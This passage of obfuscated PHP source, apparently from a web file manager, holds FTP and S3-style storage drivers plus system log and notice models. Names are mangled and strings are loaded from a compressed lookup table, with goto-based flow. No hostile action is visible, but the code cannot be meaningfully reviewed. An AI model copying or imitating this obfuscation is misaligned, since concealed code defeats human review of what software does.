$õ·ö¸íÇ = 0, $ğ©ËÍ = false) { $à…˜¿¶Ò = $this->iconvSystem($à…˜¿¶Ò); $ºÙçäËÛ = $this->scheme . $this->host . $_SERVER[óÔë„ú][4] . $this->port; $®ôÚÇÁ = curl_init(); curl_setopt($®ôÚÇÁ, CURLOPT_URL, $ºÙçäËÛ . $this->pathEncode($à…˜¿¶Ò)); curl_setopt($®ôÚÇÁ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ğ©ËÍ) { $íó Í¹¸ = $õ·ö¸íÇ + $ğ©ËÍ - 1; curl_setopt($®ôÚÇÁ, CURLOPT_RANGE, "{$õ·ö¸íÇ}\55{$íó Í¹¸}"); } curl_setopt($®ôÚÇÁ, CURLOPT_RETURNTRANSFER, 1); $¨¾²±—´ = curl_exec($®ôÚÇÁ); curl_close($®ôÚÇÁ); return $¨¾²±—´; } public function upload($Â¬©Ûöß, $ÒÙõº, $¬Šƒ•Š = false, $¶ş«ÒÄ­ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Â¬©Ûöß))) { return !1; } $Â¬©Ûöß = $this->iconvSystem($Â¬©Ûöß); $ÒÙõº = $this->iconvSystem($ÒÙõº); $ÅîõĞ¡ö = ftp_nb_put($this->connect, $Â¬©Ûöß, $ÒÙõº, FTP_BINARY); while ($ÅîõĞ¡ö == FTP_MOREDATA) { $ÅîõĞ¡ö = ftp_nb_continue($this->connect); } if ($ÅîõĞ¡ö != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][1435], !0); return !1; } return $this->getPathOuter($Â¬©Ûöß); } public function download($¶¨†‡ŞÏ, $ÊÙÅÓ = '') { if (!$this->_isconn()) { return !1; } $ÓàõàÊ = $this->pathFather($ÊÙÅÓ); if (!IO::mkdir($ÓàõàÊ)) { return !1; } $¶¨†‡ŞÏ = $this->iconvSystem($¶¨†‡ŞÏ); $ÊÙÅÓ = $this->iconvSystem($ÊÙÅÓ); $Ë¶‘¹à = ftp_nb_get($this->connect, $ÊÙÅÓ, $¶¨†‡ŞÏ, FTP_BINARY); while ($Ë¶‘¹à == FTP_MOREDATA) { $Ë¶‘¹à = ftp_nb_continue($this->connect); } if ($Ë¶‘¹à != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][1435], !0); return !1; } return $this->iconvApp($ÊÙÅÓ); } public function exist($È¶„»ˆõ) { return $this->isFile($È¶„»ˆõ) || $this->isFolder($È¶„»ˆõ); } public function isFile($©¾’Ó) { return !$this->isFolder($©¾’Ó) && $this->objectMeta($©¾’Ó); } public function isFolder($ªÙ­†’ê) { return $this->cacheMethod($_SERVER[óÔë„ú][179], $ªÙ­†’ê); } protected function objectMeta($†´ºÆ¡¡) { return $this->cacheMethod($_SERVER[óÔë„ú][181], $†´ºÆ¡¡); } protected function _objectMeta($îàˆÑ„Ş) { $ë¢ôñŸî =& $_SERVER[óÔë„ú]; if ($îàˆÑ„Ş == $ë¢ôñŸî[12] || $îàˆÑ„Ş == $ë¢ôñŸî[8]) { return array(); } if (!$this->_isconn()) { return !1; } $îàˆÑ„Ş = $this->iconvSystem($îàˆÑ„Ş); $ç–Âù¿ = array($ë¢ôñŸî[32] => $this->iconvApp($îàˆÑ„Ş), $ë¢ôñŸî[33] => $ë¢ôñŸî[230], $ë¢ôñŸî[79] => 0); @ftp_chdir($this->connect, $ë¢ôñŸî[8]); $é™€¢„Ğ = @ftp_size($this->connect, $îàˆÑ„Ş); if ($é™€¢„Ğ != -1) { $ç–Âù¿[$ë¢ôñŸî[79]] = $é™€¢„Ğ; } else { $–×äÄæ = @ftp_chdir($this->connect, $îàˆÑ„Ş); if (!$–×äÄæ) { return !1; } $ç–Âù¿[$ë¢ôñŸî[33]] = $ë¢ôñŸî[78]; } return $ç–Âù¿; } protected function _isFolder($äóğì‡¬) { $“Øèè‡ö =& $_SERVER[óÔë„ú]; if ($äóğì‡¬ == $“Øèè‡ö[12] || $äóğì‡¬ == $“Øèè‡ö[8]) { return !0; } $¯šÚ¥Š™ = $this->_objectMeta($äóğì‡¬); return isset($¯šÚ¥Š™[$“Øèè‡ö[33]]) && $¯šÚ¥Š™[$“Øèè‡ö[33]] == $“Øèè‡ö[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($ ‰ùº¨) { parent::__construct($ ‰ùº¨); $this->setSignVersion($_SERVER[óÔë„ú][247]); } public function uploadLink($çÓ¤ëô, $¾Á¤¢ò’ = 0) { $Ğ®—®”Í =& $_SERVER[óÔë„ú]; if ($this->isUploadServer()) { return; } $È·èƒÆ = $this->getType(); if (!in_array($È·èƒÆ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $åîÁòšß = (!$¾Á¤¢ò’ ? 1 : ceil($¾Á¤¢ò’ / pow(1024, 3))) * 3600 * 4; $®±“ëä… = $this->multiUploadFormData($çÓ¤ëô, $åîÁòšß); if ($®±“ëä…) { $®±“ëä…[$Ğ®—®”Í[97]] = $çÓ¤ëô; $®±“ëä…[$Ğ®—®”Í[98]] = $È·èƒÆ; } return $®±“ëä…; } public function fileOutImage($öÅİÊ, $›« ”·´ = 250) { if ($this->size($öÅİÊ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($öÅİÊ, $›« ”·´); } $óù­Äà· = $this->link($öÅİÊ); $óù­Äà· .= $_SERVER[óÔë„ú][1438] . $›« ”·´; $this->fileOutLink($óù­Äà·); } public function fileOutLink($ÕŠÉ—„¤) { $ùà®•“å =& $_SERVER[óÔë„ú]; if (substr($ÕŠÉ—„¤, 0, 7) == $ùà®•“å[313]) { $ÕŠÉ—„¤ = $ùà®•“å[314] . substr($ÕŠÉ—„¤, 7); } header($ùà®•“å[175] . $ÕŠÉ—„¤); die; } } goto e“‚ËÎ©‹é; aì…æîÇğÀ: define($_SERVER[óÔë„ú][0], $_SERVER[óÔë„ú][1]); $_SERVER[ìµÎşª–] = explode($_SERVER[óÔë„ú][2], gzinflate(substr($_SERVER[óÔë„ú][3], 10, -8))); function binCheckEq($Î¢ÎœŸ, $¶Û¨²¹) { return $Î¢ÎœŸ == $¶Û¨²¹; } goto e¯¨ë‡òî; C…É…”‚Ë¤: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\114\151\x67\150\x74\x41\x70\160"; public $modelType = "\123\x79\x73\x74\x65\x6d\117\x70\x74\151\157\x6e"; public $field = array("\156\141\x6d\x65", "\147\162\157\165\x70", "\x64\145\163\x63", "\143\x6f\156\164\145\x6e\164"); public function listData($¹ıŸ‡åÔ = false, $ëº€å¨­ = "\155\x6f\x64\151\146\171\124\x69\155\x65", $„ñ¦µ— = true) { return parent::listData($¹ıŸ‡åÔ, $ëº€å¨­, $„ñ¦µ—); } public function remove($Ÿè¬Ä³Î) { $±Æâ ¼ˆ = $this->findByName($Ÿè¬Ä³Î); if (!$±Æâ ¼ˆ) { return !1; } return parent::remove($±Æâ ¼ˆ[$_SERVER[óÔë„ú][475]]); } public function add($«†´ª£Ë) { if ($this->findByName($«†´ª£Ë[$_SERVER[óÔë„ú][32]])) { return !1; } return parent::insert($«†´ª£Ë); } public function update($‰×Š­»½, $ìù²Ì±™) { $ÑûÂÍ‚ú =& $_SERVER[óÔë„ú]; $ú™Î£û´ = $this->findByName($‰×Š­»½); $›ÂéİçĞ = $this->findByName($ìù²Ì±™[$ÑûÂÍ‚ú[32]]); if (!$ú™Î£û´ || $›ÂéİçĞ && $›ÂéİçĞ[$ÑûÂÍ‚ú[475]] != $ú™Î£û´[$ÑûÂÍ‚ú[475]]) { return !1; } return parent::update($ú™Î£û´[$ÑûÂÍ‚ú[475]], $ìù²Ì±™); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\145\155\137\x6c\157\x67"; protected $dataAuto = array(array("\x63\162\145\141\164\145\124\x69\155\x65", "\x74\151\155\x65", "\x69\x6e\x73\145\162\164", "\x66\165\156\143\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $à¢†²…Ã =& $_SERVER[óÔë„ú]; return array($à¢†²…Ã[2317] => LNG($à¢†²…Ã[2318]), $à¢†²…Ã[2319] => LNG($à¢†²…Ã[2320]), $à¢†²…Ã[1899] => LNG($à¢†²…Ã[2321]), $à¢†²…Ã[2322] => LNG($à¢†²…Ã[2323]), $à¢†²…Ã[2324] => LNG($à¢†²…Ã[2325]), $à¢†²…Ã[2326] => LNG($à¢†²…Ã[2327]), $à¢†²…Ã[2328] => LNG($à¢†²…Ã[2329]), $à¢†²…Ã[1929] => LNG($à¢†²…Ã[2329]), $à¢†²…Ã[1930] => LNG($à¢†²…Ã[2330]), $à¢†²…Ã[2331] => LNG($à¢†²…Ã[2332]), $à¢†²…Ã[2333] => LNG($à¢†²…Ã[2334]), $à¢†²…Ã[2335] => LNG($à¢†²…Ã[2336]), $à¢†²…Ã[2337] => LNG($à¢†²…Ã[2338]), $à¢†²…Ã[1927] => LNG($à¢†²…Ã[2339]), $à¢†²…Ã[2340] => LNG($à¢†²…Ã[2341]), $à¢†²…Ã[1934] => LNG($à¢†²…Ã[2342]), $à¢†²…Ã[2343] => LNG($à¢†²…Ã[2344]), $à¢†²…Ã[2345] => LNG($à¢†²…Ã[2346]), $à¢†²…Ã[2347] => LNG($à¢†²…Ã[2348]), $à¢†²…Ã[2349] => LNG($à¢†²…Ã[2350]), $à¢†²…Ã[1937] => LNG($à¢†²…Ã[2351]), $à¢†²…Ã[1938] => LNG($à¢†²…Ã[2352]), $à¢†²…Ã[2353] => LNG($à¢†²…Ã[2354]), $à¢†²…Ã[2355] => LNG($à¢†²…Ã[2356]), $à¢†²…Ã[2357] => LNG($à¢†²…Ã[2358]), $à¢†²…Ã[1932] => LNG($à¢†²…Ã[2359]), $à¢†²…Ã[2360] => LNG($à¢†²…Ã[2361]), $à¢†²…Ã[1931] => LNG($à¢†²…Ã[2362]), $à¢†²…Ã[2363] => LNG($à¢†²…Ã[2364]), $à¢†²…Ã[2365] => LNG($à¢†²…Ã[2366]), $à¢†²…Ã[2367] => LNG($à¢†²…Ã[2366]), $à¢†²…Ã[2368] => LNG($à¢†²…Ã[2369]), $à¢†²…Ã[2370] => LNG($à¢†²…Ã[2370]), $à¢†²…Ã[2371] => LNG($à¢†²…Ã[1903]), $à¢†²…Ã[2372] => LNG($à¢†²…Ã[2373]), $à¢†²…Ã[2374] => LNG($à¢†²…Ã[2375]), $à¢†²…Ã[2376] => LNG($à¢†²…Ã[2377]), $à¢†²…Ã[2378] => LNG($à¢†²…Ã[2379]), $à¢†²…Ã[2380] => LNG($à¢†²…Ã[2381]), $à¢†²…Ã[2382] => LNG($à¢†²…Ã[2382]), $à¢†²…Ã[2383] => LNG($à¢†²…Ã[2384]), $à¢†²…Ã[2385] => LNG($à¢†²…Ã[2386]), $à¢†²…Ã[2387] => LNG($à¢†²…Ã[2388]), $à¢†²…Ã[2389] => LNG($à¢†²…Ã[2390]), $à¢†²…Ã[2391] => LNG($à¢†²…Ã[2392]), $à¢†²…Ã[2393] => LNG($à¢†²…Ã[2394]), $à¢†²…Ã[212] => LNG($à¢†²…Ã[212]), $à¢†²…Ã[213] => LNG($à¢†²…Ã[2395]), $à¢†²…Ã[2396] => LNG($à¢†²…Ã[2396])); } private function typeFile() { $ùú¾›³à =& $_SERVER[óÔë„ú]; $ÒĞ¡»” = array($ùú¾›³à[1934] => array($ùú¾›³à[1935]), $ùú¾›³à[2335] => array($ùú¾›³à[2397]), $ùú¾›³à[2337] => array($ùú¾›³à[2398]), $ùú¾›³à[1927] => array($ùú¾›³à[1928], $ùú¾›³à[2399]), $ùú¾›³à[2345] => array(), $ùú¾›³à[2347] => array(), $ùú¾›³à[2349] => array(), $ùú¾›³à[1937] => array($ùú¾›³à[1939]), $ùú¾›³à[1938] => array($ùú¾›³à[1939]), $ùú¾›³à[2353] => array($ùú¾›³à[2400]), $ùú¾›³à[2355] => array($ùú¾›³à[2400]), $ùú¾›³à[2357] => array($ùú¾›³à[2401]), $ùú¾›³à[2343] => array($ùú¾›³à[2402]), $ùú¾›³à[1932] => array($ùú¾›³à[2403]), $ùú¾›³à[2360] => array($ùú¾›³à[2404]), $ùú¾›³à[1931] => array($ùú¾›³à[1933])); return $ÒĞ¡»”; } private function typeAll() { $İ‹ƒ¶éå =& $_SERVER[óÔë„ú]; $Û¿å§—Ö = $this->typeList; $Ëƒğ²‡… = array_filter($this->typeFile()); foreach ($Ëƒğ²‡… as $Åè®§·î => $øÁ—¶Ï) { $Û¿å§—Ö[$øÁ—¶Ï[0]] = $Û¿å§—Ö[$Åè®§·î]; } $Û¿å§—Ö[$İ‹ƒ¶éå[1939]] = LNG($İ‹ƒ¶éå[2405]); $Û¿å§—Ö[$İ‹ƒ¶éå[2400]] = LNG($İ‹ƒ¶éå[2406]); return $Û¿å§—Ö; } public function addLog($ş¾‰¢œ, $ıİıÔÕó = array()) { $——ŒÆ§¼ =& $_SERVER[óÔë„ú]; if (!isset($this->typeList[$ş¾‰¢œ])) { return; } $€…¾×ñ¤ = Session::get($——ŒÆ§¼[2098]); if (!$€…¾×ñ¤) { $€…¾×ñ¤ = _get($ıİıÔÕó, $——ŒÆ§¼[1758], 0); } if ($ş¾‰¢œ == $——ŒÆ§¼[2372] && is_array($ıİıÔÕó[$——ŒÆ§¼[2407]]) && !$ıİıÔÕó[$——ŒÆ§¼[2407]]) { return; } $¬¤ı™Ê = get_client_ip(); if (!$ıİıÔÕó || strlen(json_encode($ıİıÔÕó)) >= 1024 * 64) { if ($ıİıÔÕó && is_array($ıİıÔÕó)) { $ıİıÔÕó = array_intersect_key($ıİıÔÕó, array_flip($——ŒÆ§¼[475], $——ŒÆ§¼[32])); $ıİıÔÕó[$——ŒÆ§¼[2408]] = $¬¤ı™Ê; } else { $ıİıÔÕó = array($——ŒÆ§¼[2408] => $¬¤ı™Ê); } } else { if (is_array($ıİıÔÕó)) { $ıİıÔÕó[$——ŒÆ§¼[2408]] = $¬¤ı™Ê; } else { $ıİıÔÕó = array($——ŒÆ§¼[1274] => $ıİıÔÕó, $——ŒÆ§¼[2408] => $¬¤ı™Ê); } } $ıİıÔÕó = array($——ŒÆ§¼[1748] => Session::sign(), $——ŒÆ§¼[1749] => intval($€…¾×ñ¤), $——ŒÆ§¼[33] => $ş¾‰¢œ, $——ŒÆ§¼[1751] => json_encode($ıİıÔÕó)); parent::add($ıİıÔÕó); } public function remove($Î·õ±) { $this->where(array($_SERVER[óÔë„ú][493] => $Î·õ±))->delete(); } private function _makeOrder($¢ÚºàÜ€ = '') { $¦…úèƒº =& $_SERVER[óÔë„ú]; $¾•õ‚â¥ = $¦…úèƒº[231]; $ğÑíÔéì = array($¦…úèƒº[523] => $¦…úèƒº[524], $¦…úèƒº[525] => $¦…úèƒº[526]); $Ü¯ÅÚá = Input::get($¦…úèƒº[531], $¦…úèƒº[7], $¦…úèƒº[2134], array($¦…úèƒº[2052], $¦…úèƒº[525])); $Ü¯ÅÚá = $ğÑíÔéì[$Ü¯ÅÚá]; $¢ÚºàÜ€ = $¢ÚºàÜ€ . "{$¾•õ‚â¥}\x20{$Ü¯ÅÚá}"; return $this->order($¢ÚºàÜ€); } public function get($–‘ã¤¶Ñ = '') { $šâÒùşß =& $_SERVER[óÔë„ú]; if (!$–‘ã¤¶Ñ) { show_json(array()); } $Ô¾¼¡ŒÙ = array(); if ($–‘ã¤¶Ñ[$šâÒùşß[1758]]) { $Ô¾¼¡ŒÙ[$šâÒùşß[1758]] = $–‘ã¤¶Ñ[$šâÒùşß[1758]]; } if (isset($–‘ã¤¶Ñ[$šâÒùşß[820]])) { $Ÿ‡ùªù€ = $–‘ã¤¶Ñ[$šâÒùşß[820]]; $¡ßß¿ºù = isset($–‘ã¤¶Ñ[$šâÒùşß[821]]) ? $–‘ã¤¶Ñ[$šâÒùşß[821]] : time(); $Ô¾¼¡ŒÙ[$šâÒùşß[231]] = array($šâÒùşß[409], array($Ÿ‡ùªù€, $¡ßß¿ºù)); } if ($–‘ã¤¶Ñ[$šâÒùşß[33]]) { $¦‚° æ£ = explode($šâÒùşß[50], $–‘ã¤¶Ñ[$šâÒùşß[33]]); $õÍÓâÔ¹ = $this->typeFile(); $æË‡ëà¿ = array(); foreach ($¦‚° æ£ as $š™ÑØ×Æ) { $æË‡ëà¿[] = $š™ÑØ×Æ; if (isset($õÍÓâÔ¹[$š™ÑØ×Æ])) { $æË‡ëà¿ = array_merge($æË‡ëà¿, $õÍÓâÔ¹[$š™ÑØ×Æ]); } } $æË‡ëà¿ = array_unique($æË‡ëà¿); if ($æË‡ëà¿) { $Ô¾¼¡ŒÙ[$šâÒùşß[33]] = array($šâÒùşß[7], $æË‡ëà¿); } } else { $Ô¾¼¡ŒÙ[$šâÒùşß[33]] = array($šâÒùşß[2409], $šâÒùşß[2410]); } if (!empty($–‘ã¤¶Ñ[$šâÒùşß[2408]])) { $Ô¾¼¡ŒÙ[$šâÒùşß[526]] = array($šâÒùşß[459], "\x25{$–‘ã¤¶Ñ[$šâÒùşß[2408]]}\x25"); } $Ó‰Ö¾º„ = $this->_makeOrder()->where($Ô¾¼¡ŒÙ)->selectPage(); if (empty($Ó‰Ö¾º„[$šâÒùşß[445]])) { show_json(array(), !0, $Ó‰Ö¾º„[$šâÒùşß[442]]); } $Ó‰Ö¾º„[$šâÒùşß[445]] = $this->logList($Ó‰Ö¾º„[$šâÒùşß[445]]); return $Ó‰Ö¾º„; } private function ipAddress(&$öüØ¸™) { $â‰Ş¤„ì =& $_SERVER[óÔë„ú]; if (!empty($öüØ¸™[$â‰Ş¤„ì[2408]])) { $ºÕÊºš¼ = IpLocation::get($öüØ¸™[$â‰Ş¤„ì[2408]]); } else { $ºÕÊºš¼ = LNG($â‰Ş¤„ì[2411]); } $öüØ¸™[$â‰Ş¤„ì[2412]] = $ºÕÊºš¼; } private function descZipDownload($µçô—˜•, &$•à¤ƒ™Š) { $Ò½Üç€Ü =& $_SERVER[óÔë„ú]; if (!isset($µçô—˜•[$Ò½Üç€Ü[2413]])) { return; } $íÌ¸ŒèÎ = json_decode($µçô—˜•[$Ò½Üç€Ü[2413]], !0); foreach ($íÌ¸ŒèÎ as $³ØóÌˆö) { try { $½×© = IO::infoFullSimple($³ØóÌˆö[$Ò½Üç€Ü[87]]); } catch (Exception $‹ú•›èË) { continue; } $µçô—˜•[$Ò½Üç€Ü[87]] = $³ØóÌˆö[$Ò½Üç€Ü[87]]; $•à¤ƒ™Š[] = $µçô—˜•[$Ò½Üç€Ü[193]] = $½×©[$Ò½Üç€Ü[193]]; $•à¤ƒ™Š[] = $µçô—˜•[$Ò½Üç€Ü[2190]] = $½×©[$Ò½Üç€Ü[192]]; break; } return $µçô—˜•; } private function getSourceList(&$‚ÁÔ‰ñİ) { $ÜìÂ£Óú =& $_SERVER[óÔë„ú]; $ĞÌã½Š‡ = array(); foreach ($‚ÁÔ‰ñİ as $ıì„÷Õ¥ => $¤ò£µ“) { $•ôì¨ = json_decode($¤ò£µ“[$ÜìÂ£Óú[526]], !0); if ($¤ò£µ“[$ÜìÂ£Óú[33]] == $ÜìÂ£Óú[1930]) { $•ôì¨ = $this->descZipDownload($•ôì¨, $ĞÌã½Š‡); $‚ÁÔ‰ñİ[$ıì„÷Õ¥][$ÜìÂ£Óú[526]] = json_encode($•ôì¨); continue; } if (strpos($¤ò£µ“[$ÜìÂ£Óú[33]], $ÜìÂ£Óú[2192]) !== 0) { if (!isset($•ôì¨[$ÜìÂ£Óú[87]]) || strpos($¤ò£µ“[$ÜìÂ£Óú[33]], $ÜìÂ£Óú[2414]) !== 0) { continue; } try { $‚…Îóé = IO::infoFullSimple($•ôì¨[$ÜìÂ£Óú[87]]); } catch (Exception $×ê«å ) { continue; } $ĞÌã½Š‡[] = $•ôì¨[$ÜìÂ£Óú[193]] = $‚…Îóé[$ÜìÂ£Óú[193]]; $ĞÌã½Š‡[] = $•ôì¨[$ÜìÂ£Óú[2190]] = $‚…Îóé[$ÜìÂ£Óú[192]]; $‚ÁÔ‰ñİ[$ıì„÷Õ¥][$ÜìÂ£Óú[526]] = json_encode($•ôì¨); continue; } $ĞÌã½Š‡[] = $•ôì¨[$ÜìÂ£Óú[193]]; $ĞÌã½Š‡[] = $•ôì¨[$ÜìÂ£Óú[2190]]; if ($•ôì¨[$ÜìÂ£Óú[33]] == $ÜìÂ£Óú[620]) { $ĞÌã½Š‡[] = $•ôì¨[$ÜìÂ£Óú[526]][$ÜìÂ£Óú[1226]]; $ĞÌã½Š‡[] = $•ôì¨[$ÜìÂ£Óú[526]][$ÜìÂ£Óú[1227]]; } if ($•ôì¨[$ÜìÂ£Óú[33]] == $ÜìÂ£Óú[2201]) { $ĞÌã½Š‡[] = $•ôì¨[$ÜìÂ£Óú[526]][$ÜìÂ£Óú[193]]; } } if (!$ĞÌã½Š‡) { return array(); } return Model($ÜìÂ£Óú[884])->sourceListInfo($ĞÌã½Š‡, !0); } private function logList($ÑúÉÆÑÛ) { $šÓÒ¸¹ =& $_SERVER[óÔë„ú]; $±‡øÜÅ® = array_to_keyvalue($ÑúÉÆÑÛ, $šÓÒ¸¹[12], $šÓÒ¸¹[1758]); $¸ÌÃŸÑ = Model($šÓÒ¸¹[598])->userListInfo(array_unique($±‡øÜÅ®)); $Áß°Ğô = $this->getSourceList($ÑúÉÆÑÛ); $ª–êÄ« = $this->typeAll(); $Á”ĞÅ÷¿ = array(); $ƒˆğãû = array(); foreach ($ÑúÉÆÑÛ as $±ûøÃÈ‘ => $®Ù¬ú‹Æ) { $«‰¶©¶ƒ = $®Ù¬ú‹Æ[$šÓÒ¸¹[33]]; $åìïÈŠ® = isset($¸ÌÃŸÑ[$®Ù¬ú‹Æ[$šÓÒ¸¹[1758]]]) ? $¸ÌÃŸÑ[$®Ù¬ú‹Æ[$šÓÒ¸¹[1758]]] : !1; $úæ”‹ÉÉ = strpos($«‰¶©¶ƒ, $šÓÒ¸¹[2415]) === 0 ? LNG($šÓÒ¸¹[2416]) : LNG($šÓÒ¸¹[2411]); $®Ù¬ú‹Æ[$šÓÒ¸¹[32]] = isset($åìïÈŠ®[$šÓÒ¸¹[32]]) ? $åìïÈŠ®[$šÓÒ¸¹[32]] : LNG($šÓÒ¸¹[2411]); $®Ù¬ú‹Æ[$šÓÒ¸¹[2245]] = isset($åìïÈŠ®[$šÓÒ¸¹[2245]]) ? $åìïÈŠ®[$šÓÒ¸¹[2245]] : $šÓÒ¸¹[12]; $®Ù¬ú‹Æ[$šÓÒ¸¹[1647]] = isset($ª–êÄ«[$«‰¶©¶ƒ]) ? $ª–êÄ«[$«‰¶©¶ƒ] : $úæ”‹ÉÉ; $®Ù¬ú‹Æ[$šÓÒ¸¹[2133]] = $åìïÈŠ®; $×¯ÜêÃ– = json_decode($®Ù¬ú‹Æ[$šÓÒ¸¹[526]], !0); $®Ù¬ú‹Æ[$šÓÒ¸¹[2408]] = isset($×¯ÜêÃ–[$šÓÒ¸¹[2408]]) ? $×¯ÜêÃ–[$šÓÒ¸¹[2408]] : $šÓÒ¸¹[12]; $®Ù¬ú‹Æ[$šÓÒ¸¹[2412]] = IpLocation::get($®Ù¬ú‹Æ[$šÓÒ¸¹[2408]]); if (strpos($«‰¶©¶ƒ, $šÓÒ¸¹[2192]) === 0 || isset($×¯ÜêÃ–[$šÓÒ¸¹[2190]])) { $×¯ÜêÃ–[$šÓÒ¸¹[90]] = $Áß°Ğô[$×¯ÜêÃ–[$šÓÒ¸¹[193]]]; $×¯ÜêÃ–[$šÓÒ¸¹[2206]] = $Áß°Ğô[$×¯ÜêÃ–[$šÓÒ¸¹[2190]]]; if ($×¯ÜêÃ–[$šÓÒ¸¹[33]] == $šÓÒ¸¹[620]) { $×¯ÜêÃ–[$šÓÒ¸¹[526]][$šÓÒ¸¹[1226]] = $Áß°Ğô[$×¯ÜêÃ–[$šÓÒ¸¹[526]][$šÓÒ¸¹[1226]]]; $×¯ÜêÃ–[$šÓÒ¸¹[526]][$šÓÒ¸¹[1227]] = $Áß°Ğô[$×¯ÜêÃ–[$šÓÒ¸¹[526]][$šÓÒ¸¹[1227]]]; } if ($×¯ÜêÃ–[$šÓÒ¸¹[33]] == $šÓÒ¸¹[2201]) { $×¯ÜêÃ–[$šÓÒ¸¹[526]][$šÓÒ¸¹[193]] = $Áß°Ğô[$×¯ÜêÃ–[$šÓÒ¸¹[526]][$šÓÒ¸¹[193]]]; } if ($×¯ÜêÃ–[$šÓÒ¸¹[33]] == $šÓÒ¸¹[1925]) { $×¯ÜêÃ–[$šÓÒ¸¹[2206]] = $×¯ÜêÃ–[$šÓÒ¸¹[90]]; $×¯ÜêÃ–[$šÓÒ¸¹[2190]] = $×¯ÜêÃ–[$šÓÒ¸¹[2206]][$šÓÒ¸¹[193]]; $×¯ÜêÃ–[$šÓÒ¸¹[90]] = !1; $×¯ÜêÃ–[$šÓÒ¸¹[193]] = $šÓÒ¸¹[12]; } $É¼¦²«ö = array($šÓÒ¸¹[1925], $šÓÒ¸¹[2188]); if (!in_array($×¯ÜêÃ–[$šÓÒ¸¹[33]], $É¼¦²«ö)) { if ($×¯ÜêÃ–[$šÓÒ¸¹[90]] && $×¯ÜêÃ–[$šÓÒ¸¹[90]][$šÓÒ¸¹[190]] == $šÓÒ¸¹[191]) { $ƒˆğãû[] = $®Ù¬ú‹Æ[$šÓÒ¸¹[475]]; unset($ÑúÉÆÑÛ[$±ûøÃÈ‘]); continue; } if ($×¯ÜêÃ–[$šÓÒ¸¹[2206]] && $×¯ÜêÃ–[$šÓÒ¸¹[2206]][$šÓÒ¸¹[190]] == $šÓÒ¸¹[191]) { $ƒˆğãû[] = $®Ù¬ú‹Æ[$šÓÒ¸¹[475]]; unset($ÑúÉÆÑÛ[$±ûøÃÈ‘]); continue; } } } $®Ù¬ú‹Æ[$šÓÒ¸¹[526]] = $×¯ÜêÃ–; unset($®Ù¬ú‹Æ[$šÓÒ¸¹[2417]]); $Á”ĞÅ÷¿[] = $®Ù¬ú‹Æ; } $this->clearSystemPathLog($ƒˆğãû); return $Á”ĞÅ÷¿; } private function clearSystemPathLog($š¨ßµ€È) { $“÷øçæ‡ =& $_SERVER[óÔë„ú]; if (count($š¨ßµ€È) == 0) { return; } $©ÄØà‘‘ = array($“÷øçæ‡[475] => array($“÷øçæ‡[7], array_unique($š¨ßµ€È))); $this->where($©ÄØà‘‘)->delete(); } public function deviceList($¿åºÄç, $Š’Ãî„ = 0) { $ÍíüÂÉ¬ =& $_SERVER[óÔë„ú]; $½ÙÊ”ê¾ = array($ÍíüÂÉ¬[1758] => $¿åºÄç, $ÍíüÂÉ¬[231] => array($ÍíüÂÉ¬[1077], $Š’Ãî„), $ÍíüÂÉ¬[33] => $ÍíüÂÉ¬[1899]); $Œø†Äí = array(); $ÖğÂÓñ = $this->field($ÍíüÂÉ¬[2418])->where($½ÙÊ”ê¾)->order($ÍíüÂÉ¬[2204])->limit(50)->select(); foreach ($ÖğÂÓñ as $ØŠ³¾Œå => $ˆˆÎ»Ïû) { if ($ØŠ³¾Œå > 0 && abs($ˆˆÎ»Ïû[$ÍíüÂÉ¬[231]] - $ÖğÂÓñ[$ØŠ³¾Œå - 1][$ÍíüÂÉ¬[231]]) < 5) { continue; } $´‡¾•ë = json_decode($ˆˆÎ»Ïû[$ÍíüÂÉ¬[526]], !0); $ˆˆÎ»Ïû[$ÍíüÂÉ¬[2408]] = isset($´‡¾•ë[$ÍíüÂÉ¬[2408]]) ? $´‡¾•ë[$ÍíüÂÉ¬[2408]] : $ÍíüÂÉ¬[12]; unset($´‡¾•ë[$ÍíüÂÉ¬[2408]]); $œíª•Í = $this->deviceType($´‡¾•ë[$ÍíüÂÉ¬[2193]]); if (isset($Œø†Äí[$œíª•Í])) { continue; } $ˆˆÎ»Ïû[$ÍíüÂÉ¬[2412]] = IpLocation::get($ˆˆÎ»Ïû[$ÍíüÂÉ¬[2408]]); $ˆˆÎ»Ïû[$ÍíüÂÉ¬[526]] = $´‡¾•ë; $Œø†Äí[$œíª•Í] = $ˆˆÎ»Ïû; } return array_values($Œø†Äí); } public function deviceType($Ìƒ ª©ç) { return $Ìƒ ª©ç; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\156\157\x74\151\143\145\x4c\151\163\164"; public $field = array("\156\x61\155\145", "\143\x6f\156\x74\145\156\164", "\141\x75\164\150", "\x6d\x6f\144\x65", "\164\x69\x6d\145", "\164\x79\160\145", "\154\x65\166\145\154", "\145\156\x61\x62\154\145", "\x73\x6f\162\x74"); public function listData($Ÿï“óèÂ = false, $Í™„à—‘ = "\163\x6f\162\164", $×ÛªÅÄ¾ = false) { return parent::listData($Ÿï“óèÂ, $Í™„à—‘, $×ÛªÅÄ¾); } public function add($®öğôâ¶) { $ã‹Ä’Ë÷ =& $_SERVER[óÔë„ú]; $¡“ñ”í• = time(); if ($®öğôâ¶[$ã‹Ä’Ë÷[16]] == $ã‹Ä’Ë÷[2419]) { $¡“ñ”í• = strtotime($®öğôâ¶[$ã‹Ä’Ë÷[206]]); } $®öğôâ¶[$ã‹Ä’Ë÷[206]] = $¡“ñ”í•; return parent::insert($®öğôâ¶); } public function update($Ì¶‚»Ú¿, $Ş—®™˜‹) { $æ¹ˆâá™ =& $_SERVER[óÔë„ú]; $‡à©Áµ = $this->listData($Ì¶‚»Ú¿); if (!$‡à©Áµ) { return !1; } $ÜğÔıÃÅ = time(); if ($Ş—®™˜‹[$æ¹ˆâá™[16]] == $æ¹ˆâá™[2419]) { $ÜğÔıÃÅ = 